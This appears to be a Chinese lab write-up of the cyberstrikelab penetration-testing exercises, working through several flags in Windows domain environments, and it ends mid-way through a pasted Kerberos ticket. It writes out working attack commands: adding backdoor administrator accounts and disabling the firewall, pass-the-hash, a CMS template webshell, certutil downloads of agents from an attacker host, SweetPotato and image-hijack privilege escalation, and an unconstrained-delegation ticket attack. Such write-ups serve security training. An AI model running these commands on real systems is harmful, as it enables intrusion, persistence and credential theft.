<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120213310481.png"
	width="1699"
	height="803"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120213310481_hu5580405396706006697.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120213310481_hu14359927134348919188.png 1024w"
	loading="lazy"
	
		alt="image-20260120213310481"
	
	
		class="gallery-image" 
		data-flex-grow="211"
		data-flex-basis="507px"
	
></p>
<p>那直接打永恒之蓝，用命令开一个RDP，然后尝试抓取一下哈希</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120214318000.png"
	width="776"
	height="242"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120214318000_hu2389384503892951105.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120214318000_hu7129374432155690595.png 1024w"
	loading="lazy"
	
		alt="image-20260120214318000"
	
	
		class="gallery-image" 
		data-flex-grow="320"
		data-flex-basis="769px"
	
></p>
<h3 id="flag3-4">flag3
</h3><h4 id="知识点pth-1">知识点：PTH
</h4><p>直接RDP，然后传<code>mimikatz</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set command net user liernian qwer123! /add
</span></span><span class="line"><span class="cl">set command net localgroup Administrators liernian /add
</span></span><span class="line"><span class="cl">set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;
</span></span><span class="line"><span class="cl">set command &#39;netsh advfirewall set allprofiles state off&#39;
</span></span><span class="line"><span class="cl">set command &#39;reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v UserAuthentication /t REG_DWORD /d 0 /f&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120221322830.png"
	width="936"
	height="242"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120221322830_hu164606261411354811.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120221322830_hu4572717461942825380.png 1024w"
	loading="lazy"
	
		alt="image-20260120221322830"
	
	
		class="gallery-image" 
		data-flex-grow="386"
		data-flex-basis="928px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 python3 smbexec.py -hashes :d8174fc8c5ee7a8e460df2e61d00bd3c cyberstrikelab.com/administrator@192.168.20.20
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120221705585.png"
	width="1025"
	height="232"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120221705585_hu5970696780799819416.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260120221705585_hu4410113248364975083.png 1024w"
	loading="lazy"
	
		alt="image-20260120221705585"
	
	
		class="gallery-image" 
		data-flex-grow="441"
		data-flex-basis="1060px"
	
></p>
<h2 id="lab8">lab8
</h2><h3 id="flag1-7">flag1
</h3><h4 id="知识点zzzcms历史漏洞">知识点：zzzCMS历史漏洞
</h4><p>这里开始有些不一样了，首先ip就不一样了</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121162607925.png"
	width="1206"
	height="348"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121162607925_hu6947103324943191688.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121162607925_hu4152856166850736141.png 1024w"
	loading="lazy"
	
		alt="image-20260121162625422"
	
	
		class="gallery-image" 
		data-flex-grow="346"
		data-flex-basis="831px"
	
></p>
<p><code>zzzCMS</code>搜索一波nday</p>
<p>首先admin/admin123456，进入后台</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121162943671.png"
	width="833"
	height="525"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121162943671_hu10626182516883471291.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121162943671_hu7076348169977625301.png 1024w"
	loading="lazy"
	
		alt="image-20260121162943671"
	
	
		class="gallery-image" 
		data-flex-grow="158"
		data-flex-basis="380px"
	
></p>
<p>在模板管理的html文件夹的about处写下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{if:assert($_POST [x])}xxx {end if}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121164255726.png"
	width="1715"
	height="558"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121164255726_hu7225739316509179042.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121164255726_hu3971103488783022804.png 1024w"
	loading="lazy"
	
		alt="image-20260121164255726"
	
	
		class="gallery-image" 
		data-flex-grow="307"
		data-flex-basis="737px"
	
></p>
<p>然后就成功成为后门了？和源码有关系</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124172514130.png"
	width="1176"
	height="1201"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124172514130_hu11410651349290172756.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124172514130_hu2076280454154587858.png 1024w"
	loading="lazy"
	
		alt="image-20260124172514130"
	
	
		class="gallery-image" 
		data-flex-grow="97"
		data-flex-basis="235px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121164702884.png"
	width="1101"
	height="1095"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121164702884_hu12337224127038691569.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121164702884_hu6420812860598393262.png 1024w"
	loading="lazy"
	
		alt="image-20260121164702884"
	
	
		class="gallery-image" 
		data-flex-grow="100"
		data-flex-basis="241px"
	
></p>
<p>这个马还必须base64编码才能连接，不懂</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121164948923.png"
	width="1142"
	height="804"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121164948923_hu15064895230324237916.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121164948923_hu11991949301952482516.png 1024w"
	loading="lazy"
	
		alt="image-20260121164948923"
	
	
		class="gallery-image" 
		data-flex-grow="142"
		data-flex-basis="340px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121165038807.png"
	width="791"
	height="267"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121165038807_hu6556625773417342742.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121165038807_hu6874590481229669255.png 1024w"
	loading="lazy"
	
		alt="image-20260121165038807"
	
	
		class="gallery-image" 
		data-flex-grow="296"
		data-flex-basis="711px"
	
></p>
<h3 id="flag2-6">flag2
</h3><h4 id="知识点甜土豆提权转义开rdp爆破rdp">知识点：（甜土豆提权，转义开RDP）爆破RDP
</h4><p>明显看到有内网网段</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121165200376.png"
	width="796"
	height="668"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121165200376_hu7561600236911121762.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121165200376_hu10425546222624404105.png 1024w"
	loading="lazy"
	
		alt="image-20260121165200376"
	
	
		class="gallery-image" 
		data-flex-grow="119"
		data-flex-basis="285px"
	
></p>
<p>上传fscan和stowaway，蚁剑发现超时了</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121165558127.png"
	width="846"
	height="156"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121165558127_hu3940346727503835241.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121165558127_hu9108820848262125005.png 1024w"
	loading="lazy"
	
		alt="image-20260121165558127"
	
	
		class="gallery-image" 
		data-flex-grow="542"
		data-flex-basis="1301px"
	
></p>
<p>开一个http服务下载</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certutil -urlcache -split -f http://172.16.233.2:50050/windows_x64_agent.exe windows_x64_agent.exe
</span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li><strong>certutil</strong> - Windows 系统自带的证书管理工具，但常被用作下载工具</li>
<li><strong>-urlcache</strong> - 使用 URL 缓存功能</li>
<li><strong>-split</strong> - 将 HTTP 响应头和数据分开</li>
<li><strong>-f</strong> - 强制覆盖现有文件</li>
</ol>
<p>然后上<code>stowaway</code>和<code>fscan</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121171221813.png"
	width="1703"
	height="685"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121171221813_hu5235641433262279613.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121171221813_hu9500178353416162837.png 1024w"
	loading="lazy"
	
		alt="image-20260121171221813"
	
	
		class="gallery-image" 
		data-flex-grow="248"
		data-flex-basis="596px"
	
></p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>ip</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>10.5.5.2</td>
<td>外网机  （已拿下）</td>
</tr>
<tr>
<td>10.5.5.33</td>
<td>内网机</td>
</tr>
<tr>
<td>10.5.5.66</td>
<td>DC域控</td>
</tr>
</tbody>
</table></div>
<p>内网看来没有什么东西了，打个<code>RDP</code>在外网机子里分析一下域内信息吧</p>
<p>打<code>RDP</code>之后发现进不去，回头查看了一下，是机子的权限不够。无法添加新用户</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whoami /priv
</span></span></code></pre></td></tr></table>
</div>
</div><p>发现开启了<code>SeImpersonatePrivilege</code>那么就可以用甜土豆进行提权</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121172444704.png"
	width="678"
	height="307"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121172444704_hu11934659137687531936.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121172444704_hu110413774122918245.png 1024w"
	loading="lazy"
	
		alt="image-20260121172444704"
	
	
		class="gallery-image" 
		data-flex-grow="220"
		data-flex-basis="530px"
	
></p>
<p>依旧<code>http</code>服务上传甜土豆</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certutil -urlcache -split -f http://172.16.233.2:50050/SweetPotato.exe SweetPotato.exe
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121173009173.png"
	width="1123"
	height="489"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121173009173_hu15692259269315595442.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121173009173_hu7780117607305328037.png 1024w"
	loading="lazy"
	
		alt="image-20260121173009173"
	
	
		class="gallery-image" 
		data-flex-grow="229"
		data-flex-basis="551px"
	
></p>
<p>甜土豆记得要双引号，然后里面需要转义</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SweetPotato.exe -a &#34;REG ADD \&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&#34; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> SweetPotato.exe -a &#34;net user liernian 123Qwe! /add&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SweetPotato.exe -a &#34;net localgroup Administrators liernian /add&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SweetPotato.exe -a &#34;reg add \&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&#34; /v UserAuthentication /t REG_DWORD /d 0 /f&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SweetPotato.exe -a &#34;netsh advfirewall set allprofiles state off&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>终于是登上了</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121175234188.png"
	width="646"
	height="451"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121175234188_hu2747070716087764815.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121175234188_hu5884684766976033692.png 1024w"
	loading="lazy"
	
		alt="image-20260121175234188"
	
	
		class="gallery-image" 
		data-flex-grow="143"
		data-flex-basis="343px"
	
></p>
<p>也是发现了有360，CS传马的话估计会被杀，不过做做免杀应该也还可以</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121175400529.png"
	width="130"
	height="142"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121175400529_hu11679288791789926450.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121175400529_hu12164004933598278860.png 1024w"
	loading="lazy"
	
		alt="image-20260121175400529"
	
	
		class="gallery-image" 
		data-flex-grow="91"
		data-flex-basis="219px"
	
></p>
<p>然后fscan其实看到了33那个口开启了<code>3389</code>我们可以爆破一下（那我这个RDP不是白搞了）</p>
<p>爆破RDP</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121181325091.png"
	width="1179"
	height="976"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121181325091_hu12322870041059086470.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121181325091_hu12201062555254812929.png 1024w"
	loading="lazy"
	
		alt="image-20260121181325091"
	
	
		class="gallery-image" 
		data-flex-grow="120"
		data-flex-basis="289px"
	
></p>
<p>administrator/admin@123456</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121180840580.png"
	width="464"
	height="400"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121180840580_hu15928606550263336619.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121180840580_hu6898512955363755149.png 1024w"
	loading="lazy"
	
		alt="image-20260121180840580"
	
	
		class="gallery-image" 
		data-flex-grow="116"
		data-flex-basis="278px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121181356904.png"
	width="1004"
	height="307"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121181356904_hu5936157523076860997.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121181356904_hu17273749098337253369.png 1024w"
	loading="lazy"
	
		alt="image-20260121181356904"
	
	
		class="gallery-image" 
		data-flex-grow="327"
		data-flex-basis="784px"
	
></p>
<h3 id="flag3-5">flag3
</h3><h4 id="知识点非约束性委派上线cspowershell-command上线svc-exe提权pth">知识点：非约束性委派（上线CS、<code>powershell command</code>上线）、svc-exe提权、PTH
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Rubeus.exe monitor /interval:2 /filteruser:DC$
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">监听域控的连接
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SpoolSample.exe DC CYBERWEB
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">强制域控回连，获取票据
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121185142788.png"
	width="1306"
	height="400"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121185142788_hu17607667253700890598.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260121185142788_hu2006529593221245902.png 1024w"
	loading="lazy"
	
		alt="image-20260121185142788"
	
	
		class="gallery-image" 
		data-flex-grow="326"
		data-flex-basis="783px"
	
></p>
<p>无奈只能上线CS看看，还得免杀一下</p>
<p><a class="link" href="https://github.com/hack2fun/BypassAV"  target="_blank" rel="noopener"
    >hack2fun/BypassAV: Cobalt Strike插件，用于快速生成免杀的可执行文件</a></p>
<p>这个插件我运行下来生成不了文件，很是烦躁，最后还是用<code>powershell command</code>来上线payload的，我发现这种方式挺好的，因为是生成命令，你拿到shell之后执行一下命令就行</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124151801966.png"
	width="1526"
	height="971"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124151801966_hu14111920217172214959.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124151801966_hu12058936831188468357.png 1024w"
	loading="lazy"
	
		alt="image-20260124151801966"
	
	
		class="gallery-image" 
		data-flex-grow="157"
		data-flex-basis="377px"
	
></p>
<p>使用甜土豆提权，一键上线</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124152438070.png"
	width="1043"
	height="824"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124152438070_hu4312288190900200306.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124152438070_hu7868832948790405597.png 1024w"
	loading="lazy"
	
		alt="image-20260124152438070"
	
	
		class="gallery-image" 
		data-flex-grow="126"
		data-flex-basis="303px"
	
></p>
<p>接下来就是比较简单的了</p>
<p><code>flag2</code>是<code>RDP</code>爆破来着，爆破出来直接转发上线，这个就是建立一个监听器，还要生成<code>exe</code>执行</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124162343987.png"
	width="876"
	height="363"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124162343987_hu12568038716854687881.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124162343987_hu11131919839291545572.png 1024w"
	loading="lazy"
	
		alt="image-20260124162343987"
	
	
		class="gallery-image" 
		data-flex-grow="241"
		data-flex-basis="579px"
	
></p>
<p>在CS上尝试进行约束性委派攻击</p>
<p>尝试失败过后发现应该是权限不够，，因为有本地管理员的权限，可以尝试进行镜像劫持提权，提权至system</p>
<p>好像有CS自带的<code>svc-exe</code>提权，新建一个<code>smb</code>的监听器</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124163757844.png"
	width="1383"
	height="217"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124163757844_hu13822750700572561751.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124163757844_hu15529742998597701847.png 1024w"
	loading="lazy"
	
		alt="image-20260124163757844"
	
	
		class="gallery-image" 
		data-flex-grow="637"
		data-flex-basis="1529px"
	
></p>
<p>直接打</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">elevate svc-exe svc-exe
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124163927692.png"
	width="1323"
	height="949"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124163927692_hu6914383866010910554.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124163927692_hu13906676874339901309.png 1024w"
	loading="lazy"
	
		alt="image-20260124163927692"
	
	
		class="gallery-image" 
		data-flex-grow="139"
		data-flex-basis="334px"
	
></p>
<p>这里我们也尝试用镜像劫持提权一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg add &#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&#34; /v &#34;Debugger&#34; /t REG_SZ /d &#34;c:\windows\system32\cmd.exe&#34; /f
</span></span></code></pre></td></tr></table>
</div>
</div><p>也成功了，只要在这个界面运行之前那个转发上线的<code>exe</code>就行</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124164454505.png"
	width="1107"
	height="623"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124164454505_hu12980161164783698019.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124164454505_hu11027613314496482247.png 1024w"
	loading="lazy"
	
		alt="image-20260124164454505"
	
	
		class="gallery-image" 
		data-flex-grow="177"
		data-flex-basis="426px"
	
></p>
<p>最后就是打约束性委派</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\Users\Administrator\Desktop\Rubeus.exe monitor /interval:2 /filteruser:DC$
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">shell C:\Users\Administrator\Desktop\SpoolSample.exe DC CYBERWEB
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124165341579.png"
	width="1114"
	height="566"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124165341579_hu62459147251790146.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124165341579_hu9176275462661264472.png 1024w"
	loading="lazy"
	
		alt="image-20260124165341579"
	
	
		class="gallery-image" 
		data-flex-grow="196"
		data-flex-basis="472px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\Users\Administrator\Desktop\Rubeus.exe ptt /ticket:doIFtDCCBbCgAwIBBaEDAgEWooIErDCCBKhhggSkMIIEoKADAgEFoRQbEkNZQkVSU1RSSUtFTEFCLkNPTaInMCWgAwIBAqEeMBwbBmtyYnRndBsSQ1lCRVJTVFJJS0VMQUIuQ09No4IEWDCCBFSgAwIBEqEDAgECooIERgSCBEIMIRnFPZE6IpeieG1EfYJtn+TpyvyeQhDyWhmUUc56oRz0hb3kJ6taODtDs2YkhfJD/zuUZg5HtRWS4rovYJ6F8fuU1qzm/ygK9LB2xmSVJFtufmc0rAcU/z1McLDJCA4cxUPiVhjzCWH1e4fR+XiYEPh/tNteFlZQIZC/68dkL/d0lLOQAazGcfPRizzEHwGaO9qkGWss1d2+96osftJq771WJCAO1cXt8m23iADR2NCT+7rBvE9M3v9ZbJ25vfQDg9IgRTuIARtJkGcqcYkwCeEw4+veOGIpdjohGxOTqHl0CWGT0SQ/0D7MnpXXjrBYWv1nGGhS2TdwSPw3FDsh5uShpn2ZoWgqX5BHefGykHmHynqKWLGZGbjjgilIIegto3QBHM0txzlDUC3Et13Tmlu47bxsjpyhPAWw647SDK04p6M++mxw6cDU5IQj+UEu/qDsuXPKug9d4lQ5ERyolpb6QEdau9p4NfqZ9GJAXz53nAmC0ztKe8CixYdRKS3X6ylp/yq47DgbcisJNlX+JM8YrQqENG+QJOfbVhu6NkYpA4sAE0BCNB6eWkbhV1p3aBFwR2RT/SejppUcqORmJJ1HZpOoKkH27nQ69sC9tXQNnq3ALFXRTWBWCyydDujShufOKC2qJpYCFon6/2yqeKXn8ZuA1AqnmZjCDzyf0lhVJG6hzGt8fxdOJToUcd8bndKSwi/59yUWb/VQGixh1dXyGB383SyRJWCmwyFqnvPl+V7HFcMm3SEMibCGv1w+q+Ym4mwMR1omTW6eO9c98W+J0PtUw4BLFdDBG78aPgG1wTcSx5i/kwCRFYN/M+aDRf/e+8MQCn12NnqX0JUZ0ZEDNfuKEfO1G3O1HTZMT0jmQYudKWAa5DngeY9qu8sR68KkGvpcN20uHfnagercgcVRlY32bpzENfkBqIMgftQw1YzRWf5JRVVxG9zbT65D7t1trcGAamQyWuApvjTic00gIKtxESAIQwrtqgznbecU6qSETtgjNdsjp+11luXlZON2H/exdzIp5ULZ2G5TwxfJbLwCESMOSyEI0WYq5KcX8Nh/FxvVzF